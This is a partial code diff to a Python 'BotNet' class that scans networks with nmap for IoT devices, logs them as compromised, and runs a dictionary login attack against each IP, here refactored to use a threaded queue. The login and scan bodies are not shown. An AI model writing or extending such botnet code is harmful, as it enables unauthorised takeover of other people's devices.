@@ -1,4 +1,6 @@
 import nmap
+from threading import Thread
+from queue import Queue
 
 
 class BotNet(object):
@@ -8,14 +10,17 @@ class BotNet(object):
         self._scanner = nmap.PortScanner()
         self._compromisedIot = []
 
-    def dictionaryAttack(self):
+    def scan(self, q):
+        pass
+
+    def dictionaryAttack(self, q):
         """
         Execute the dictionary attack
         :return:
         """
-        vulnerableIot = self._openFile('vulnerableIot.txt', 'r')
-        lines = vulnerableIot.readlines()
-        for ip in lines:
+        # vulnerableIot = self._openFile('vulnerableIot.txt', 'r')
+        # lines = vulnerableIot.readlines()
+        for ip in q.get():
             print(ip)
             self._login(ip.replace('\n', ''))
 
@@ -50,7 +55,6 @@ class BotNet(object):
     def findVulnerabilities(self):
         """
         SCAN 2
-
         :return:
         """
 
@@ -78,7 +82,6 @@ class BotNet(object):
     def findDevices(self):
         """
         SCAN 1
-
         find vulnerable IoT devices in networks
         :return:
         """
@@ -89,7 +92,6 @@ class BotNet(object):
             for newIp in self._scanner.all_hosts():
                 self._compromisedIot.append(newIp)
                 file.write(newIp + '\n')
-                # Check for
         file.close()
 
     @staticmethod
